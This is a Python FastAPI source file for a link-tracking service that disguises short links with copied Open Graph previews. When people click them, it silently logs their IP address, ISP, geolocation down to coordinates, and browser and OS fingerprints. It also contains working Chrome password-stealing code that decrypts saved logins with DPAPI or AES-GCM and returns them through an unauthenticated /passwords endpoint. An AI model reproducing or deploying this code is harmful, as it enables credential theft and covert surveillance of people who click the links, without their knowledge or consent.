from fastapi import FastAPI, Request, Form, Header, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import sqlite3
import string
import random
import asyncio
from datetime import datetime
import socket
import os
import sys
import json
import base64
import shutil

import httpx
from bs4 import BeautifulSoup
from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user-agents
from pydantic import BaseModel
from Cryptodome.Cipher import AES  # pip install pycryptodome

# Environment config
BITLY_TOKEN = os.getenv("BITLY_TOKEN")  # Set this in your environment for Bitly integration

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

DB_PATH = "links.db"
SERVICE_URL = "https://q3os.onrender.com/"  # ← your deployed URL


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # ─── links table ────────────────────────────────────────────────────────
    c.execute("""
    CREATE TABLE IF NOT EXISTS links (
      id INTEGER PRIMARY KEY,
      code TEXT UNIQUE,
      target TEXT,
      created_at TEXT,
      og_title TEXT,
      og_description TEXT,
      og_image TEXT,

      capture_ip           INTEGER DEFAULT 0,
      capture_host         INTEGER DEFAULT 0,
      capture_provider     INTEGER DEFAULT 0,
      capture_proxy        INTEGER DEFAULT 0,
      capture_continent    INTEGER DEFAULT 0,
      capture_country      INTEGER DEFAULT 0,
      capture_region       INTEGER DEFAULT 0,
      capture_city         INTEGER DEFAULT 0,
      capture_latlong      INTEGER DEFAULT 0,

      capture_browser      INTEGER DEFAULT 0,
      capture_cookies      INTEGER DEFAULT 0,
      capture_flash        INTEGER DEFAULT 0,
      capture_java         INTEGER DEFAULT 0,
      capture_plugins      INTEGER DEFAULT 0,

      capture_os           INTEGER DEFAULT 0,
      capture_resolution   INTEGER DEFAULT 0,
      capture_localtime    INTEGER DEFAULT 0,
      capture_timezone     INTEGER DEFAULT 0
    )""")

    # ─── visits table ────────────────────────────────────────────────────────
    c.execute("""
    CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY,
      link_id INTEGER,
      ip TEXT,
      host TEXT,
      provider TEXT,
      proxy TEXT,
      continent TEXT,
      country TEXT,
      region TEXT,
      city TEXT,
      latlong TEXT,
      browser TEXT,
      cookies_enabled INTEGER,
      flash TEXT,
      java_enabled INTEGER,
      plugins TEXT,
      os TEXT,
      resolution TEXT,
      local_time TEXT,
      time_zone TEXT,
      user_agent TEXT,
      timestamp TEXT
    )""")
    conn.commit()
    conn.close()


@app.on_event("startup")
async def startup():
    init_db()


def generate_code(length: int = 6) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


# ─── External URL Shortener Helpers ─────────────────────────────────────
async def shorten_with_tinyurl(url: str) -> str:
    api_url = f"http://tinyurl.com/api-create.php?url={url}"
    async with httpx.AsyncClient(timeout=5.0) as client:
        resp = await client.get(api_url)
        return resp.text if resp.status_code == 200 else url


async def shorten_with_bitly(url: str) -> str:
    if not BITLY_TOKEN:
        return url
    headers = {"Authorization": f"Bearer {BITLY_TOKEN}", "Content-Type": "application/json"}
    payload = {"long_url": url}
    async with httpx.AsyncClient(timeout=5.0) as client:
        resp = await client.post("https://api-ssl.bitly.com/v4/shorten", json=payload, headers=headers)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("link", url)
        return url


# ─── Chrome‑password–fetching helpers ────────────────────────────────────
class PasswordEntry(BaseModel):
    origin_url: str
    username: str
    password: str


def get_chrome_master_key() -> bytes:
    """
    Read the AES master key from Chrome's Local State.
    On Windows it's DPAPI-protected (prefix "DPAPI"), on Linux/macOS it's raw.
    """
    # Determine base path
    if sys.platform == "win32":
        base = os.environ.get("LOCALAPPDATA", "")
        sub = r"Google\Chrome\User Data\Local State"
    else:
        base = os.path.expanduser("~/.config/google-chrome")
        sub = "Local State"

    local_state_path = os.path.join(base, sub)
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    if sys.platform == "win32":
        # strip DPAPI prefix
        encrypted_key = encrypted_key[5:]
        import win32crypt  # only on Windows
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # on Linux/macOS it's already the raw AES key
    return encrypted_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    """
    Decrypt a Chrome-encrypted password blob:
    - Newer Chrome: AES-GCM (prefix "v10")
    - Older Windows fallback: DPAPI-only
    - Other OS & non-v10 blobs: unsupported → empty string
    """
    if buff.startswith(b"v10"):
        iv = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

    if sys.platform == "win32":
        import win32crypt
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()

    # unsupported on Linux/macOS
    return ""


def fetch_chrome_passwords() -> list[PasswordEntry]:
    """Copy Chrome's Login Data DB, decrypt each entry, return list."""
    # Windows-only path for the SQLite DB
    user_data = os.path.join(
        os.environ.get("LOCALAPPDATA", ""),
        r"Google\Chrome\User Data\Default"
    )
    login_db = os.path.join(user_data, "Login Data")
    tmp_db = os.path.join(os.environ.get("TMP", "/tmp"), "LoginDataTemp.db")
    shutil.copy2(login_db, tmp_db)

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT origin_url, username_value, password_value "
        "FROM logins WHERE username_value<>''"
    )
    master_key = get_chrome_master_key()
    entries = []
    for origin, user, encpw in cursor.fetchall():
        try:
            pw = decrypt_password(encpw, master_key)
        except Exception:
            pw = ""
        entries.append(PasswordEntry(origin_url=origin, username=user, password=pw))

    cursor.close()
    conn.close()
    os.remove(tmp_db)
    return entries


@app.get("/passwords", response_model=list[PasswordEntry])
def read_passwords():
    """
    Return all passwords saved in Chrome (Windows).
    WARNING: only run locally over HTTPS or localhost!
    """
    try:
        return fetch_chrome_passwords()
    except FileNotFoundError:
        raise HTTPException(500, detail="Chrome Login Data DB not found")
    except Exception as e:
        raise HTTPException(500, detail=f"Failed to decrypt passwords: {e}")


# ─── your existing routes below… ────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/create", response_class=HTMLResponse)
async def create_link(
    request: Request,
    target_url: str = Form(...),
    shortener: str = Form(...),

    capture_ip: str = Form(None),
    capture_host: str = Form(None),
    capture_provider: str = Form(None),
    capture_proxy: str = Form(None),
    capture_continent: str = Form(None),
    capture_country: str = Form(None),
    capture_region: str = Form(None),
    capture_city: str = Form(None),
    capture_latlong: str = Form(None),

    capture_browser: str = Form(None),
    capture_cookies: str = Form(None),
    capture_flash: str = Form(None),
    capture_java: str = Form(None),
    capture_plugins: str = Form(None),

    capture_os: str = Form(None),
    capture_resolution: str = Form(None),
    capture_localtime: str = Form(None),
    capture_timezone: str = Form(None)
):
    # 1) determine code for local redirect
    if shortener == "random":
        code = generate_code()
    elif shortener in ("tinyurl", "bitly"):
        code = generate_code()
    else:
        code = shortener  # user-provided custom code

    # 2) scrape Open Graph metadata
    og_title = og_description = og_image = ""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            resp = await client.get(target_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            def meta_prop(p):
                tag = soup.find("meta", property=p)
                return tag["content"] if tag and tag.has_attr("content") else ""
            og_title = meta_prop("og:title")
            og_description = meta_prop("og:description")
            og_image = meta_prop("og:image")
    except Exception:
        pass

    # 3) collect capture flags
    flags = { key: bool(val) for key, val in {
        'capture_ip': capture_ip,
        'capture_host': capture_host,
        'capture_provider': capture_provider,
        'capture_proxy': capture_proxy,
        'capture_continent': capture_continent,
        'capture_country': capture_country,
        'capture_region': capture_region,
        'capture_city': capture_city,
        'capture_latlong': capture_latlong,
        'capture_browser': capture_browser,
        'capture_cookies': capture_cookies,
        'capture_flash': capture_flash,
        'capture_java': capture_java,
        'capture_plugins': capture_plugins,
        'capture_os': capture_os,
        'capture_resolution': capture_resolution,
        'capture_localtime': capture_localtime,
        'capture_timezone': capture_timezone
    }.items() }

    # 4) insert link + flags
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    created_at = datetime.utcnow().isoformat()

    cols = ", ".join(flags.keys())
    placeholders = ", ".join("?" for _ in flags)
    vals = [int(v) for v in flags.values()]

    try:
        c.execute(f"""
          INSERT INTO links
            (code, target, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])
    except sqlite3.IntegrityError:
        # collision; regenerate
        code = generate_code()
        c.execute(f"""
          INSERT INTO links
            (code, target, created_at, og_title, og_description, og_image, {cols})
          VALUES
            (?, ?, ?, ?, ?, ?, {placeholders})
        """, [code, target_url, created_at, og_title, og_description, og_image, *vals])

    conn.commit()
    conn.close()

    # Build URLs
    link_url = request.url_for("redirect_to_target", code=code)
    track_url = request.url_for("track", code=code)

    # 5) shorten via selected API if requested
    if shortener == "tinyurl":
        short_url = await shorten_with_tinyurl(link_url)
    elif shortener == "bitly":
        short_url = await shorten_with_bitly(link_url)
    else:
        short_url = link_url

    # 6) return results
    return templates.TemplateResponse(
        "result.html",
        {"request": request, "link_url": link_url, "track_url": track_url, "short_url": short_url}
    )


@app.get("/{code}", response_class=HTMLResponse)
async def redirect_to_target(
    request: Request,
    code: str,
    x_real_ip: str | None = Header(None),
    x_forwarded_for: str | None = Header(None)
):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"""
      SELECT
        id, target, og_title, og_description, og_image,
        capture_ip, capture_host, capture_provider, capture_proxy,
        capture_continent, capture_country, capture_region, capture_city, capture_latlong,
        capture_browser, capture_cookies, capture_flash, capture_java, capture_plugins,
        capture_os, capture_resolution, capture_localtime, capture_timezone
      FROM links WHERE code=?
    """, (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")

    (
        link_id, target, og_title, og_description, og_image,
        cap_ip, cap_host, cap_provider, cap_proxy,
        cap_continent, cap_country, cap_region, cap_city, cap_latlong,
        cap_browser, cap_cookies, cap_flash, cap_java, cap_plugins,
        cap_os, cap_resolution, cap_localtime, cap_timezone
    ) = row

    # ─── server-side captures ───────────────────────────────────────────────
    if x_real_ip:
        ip = x_real_ip.strip()
    elif x_forwarded_for:
        ip = x_forwarded_for.split(",")[0].strip()
    else:
        ip = request.client.host or ""

    ua_string = request.headers.get("user-agent", "")
    ua = ua_parse(ua_string)

    host = ""
    if cap_host:
        try:
            host = socket.gethostbyaddr(ip)[0]
        except Exception:
            host = ""

    country = region = city = continent = provider = proxy = latlong = ""
    need_geo = any([
        cap_provider, cap_proxy, cap_continent,
        cap_country, cap_region, cap_city, cap_latlong
    ])
    if need_geo and ip:
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                r = await client.get(f"https://ipapi.co/{ip}/json")
                data = r.json()
                if r.status_code != 200 or data.get("error"):
                    raise ValueError("ipapi error")
            except Exception:
                r2 = await client.get(
                    f"http://ip-api.com/json/{ip}"
                    "?fields=status,message,country,regionName,city,continent,org,proxy,lat,lon"
                )
                data = r2.json() if r2.status_code == 200 else {}
            if cap_provider:   provider  = data.get("org", "") or ""
            if cap_proxy:      proxy     = str(data.get("proxy", "")) or ""
            if cap_continent:  continent = data.get("continent", "") or ""
            if cap_country:    country   = data.get("country_name", "") or data.get("country", "") or ""
            if cap_region:     region    = data.get("region", "") or data.get("regionName", "") or ""
            if cap_city:       city      = data.get("city", "") or ""
            if cap_latlong:
                lat = data.get("latitude") or data.get("lat")
                lon = data.get("longitude") or data.get("lon")
                latlong = f"{lat},{lon}" if lat and lon else ""

    cookies_enabled = 1 if cap_cookies and "cookie" in request.headers else 0

    browser = ""
    if cap_browser:
        fam = ua.browser.family
        ver = ".".join(str(x) for x in ua.browser.version)
        browser = f"{fam} {ver}".strip()

    os_str = ""
    if cap_os:
        fam = ua.os.family
        ver = ".".join(str(x) for x in ua.os.version)
        os_str = f"{fam} {ver}".strip()

    flash_v    = ""
    java_e     = 0
    plugins    = ""
    resolution = ""
    local_time = ""
    time_zone  = ""

    timestamp = datetime.utcnow().isoformat()
    c.execute("""
      INSERT INTO visits
        (link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
         browser, cookies_enabled, flash, java_enabled, plugins,
         os, resolution, local_time, time_zone, user_agent, timestamp)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
        browser, cookies_enabled, flash_v, java_e, plugins,
        os_str, resolution, local_time, time_zone, ua_string, timestamp
    ))
    conn.commit()
    conn.close()

    return templates.TemplateResponse("redirect.html", {
        "request": request,
        "target": target,
        "og_title": og_title,
        "og_description": og_description,
        "og_image": og_image,
        "capture_flash": cap_flash,
        "capture_java": cap_java,
        "capture_plugins": cap_plugins,
        "capture_resolution": cap_resolution,
        "capture_localtime": cap_localtime,
        "capture_timezone": cap_timezone,
        "code": code
    })


@app.post("/collect")
async def collect_data(request: Request):
    data = await request.json()
    code = data.get("code")
    if not code:
        raise HTTPException(400, "Missing code")

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # find latest visit
    c.execute(
        "SELECT MAX(id) FROM visits WHERE link_id=(SELECT id FROM links WHERE code=?)",
        (code,)
    )
    visit_id = c.fetchone()[0]

    updates = []
    params = []
    for field in ("cookies_enabled", "resolution", "local_time", "time_zone", "flash", "java_enabled", "plugins"):
        if field in data:
            updates.append(f"{field}=?")
            params.append(data[field])

    if updates and visit_id:
        sql = f"UPDATE visits SET {', '.join(updates)} WHERE id=?"
        c.execute(sql, (*params, visit_id))
        conn.commit()

    conn.close()
    return {"status": "ok"}


@app.get("/track/{code}", response_class=HTMLResponse)
async def track(request: Request, code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute("SELECT id FROM links WHERE code=?", (code,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(404, "Link not found")
    link_id = row[0]

    c.execute("""
      SELECT
        ip, host, provider, proxy, continent, country, region, city, latlong,
        browser, cookies_enabled, flash, java_enabled, plugins,
        os, resolution, local_time, time_zone, user_agent, timestamp
      FROM visits
      WHERE link_id=?
      ORDER BY timestamp DESC
    """, (link_id,))
    visits = c.fetchall()
    conn.close()

    return templates.TemplateResponse(
        "track.html",
        {"request": request, "code": code, "visits": visits}
    )


@app.get("/api/visit-metadata/{code}")
async def visit_metadata(code: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "SELECT COUNT(*) FROM visits v JOIN links l ON v.link_id = l.id WHERE l.code = ?",
        (code,)
    )
    count = c.fetchone()[0]
    conn.close()
    return {"count": count}


@app.get("/ping")
async def ping():
    return {"status": "alive"}


@app.on_event("startup")
async def schedule_ping_task():
    async def ping_loop():
        async with httpx.AsyncClient(timeout=5.0) as client:
            while True:
                try:
                    r = await client.get(f"{SERVICE_URL}/ping")
                    if r.status_code != 200:
                        print(f"[Ping] returned {r.status_code}")
                except Exception as e:
                    print(f"[PingError] {e!r}")
                await asyncio.sleep(10)
    asyncio.create_task(ping_loop())
